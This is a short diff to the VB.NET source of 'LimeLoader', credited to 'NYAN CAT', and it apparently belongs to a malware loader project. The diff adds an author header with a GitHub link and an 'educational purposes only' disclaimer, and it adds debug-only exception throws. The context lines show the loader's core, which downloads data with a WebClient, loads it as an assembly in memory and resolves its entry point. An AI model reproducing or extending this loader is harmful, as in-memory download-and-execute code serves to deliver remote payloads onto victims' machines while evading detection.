@@ -1,4 +1,11 @@
-﻿'// LimeLoader : NYAN CAT
+﻿
+'       │ Author     : NYAN CAT
+
+'       │ Name       : LimeLoader
+
+'       Contact Me   : https://github.com/NYAN-x-CAT
+
+'       This program is distributed for educational purposes only.
 
 Imports System.Net
 Imports System.Threading
@@ -25,6 +32,9 @@ Public Class Lime
             WC.Dispose()
             Return GetLoad(Data)
         Catch ex As Exception
+#If DEBUG Then
+            Throw New ArgumentException(ex.Message)
+#End If
         End Try
     End Function
 
@@ -34,6 +44,9 @@ Public Class Lime
                 Return GetEP(Assembly.Load(Data))
             End If
         Catch ex As Exception
+#If DEBUG Then
+            Throw New ArgumentException(ex.Message)
+#End If
         End Try
     End Function
 
@@ -47,6 +60,9 @@ Public Class Lime
                 End If
             End If
         Catch ex As Exception
+#If DEBUG Then
+            Throw New ArgumentException(ex.Message)
+#End If
         End Try
     End Function
 End Class
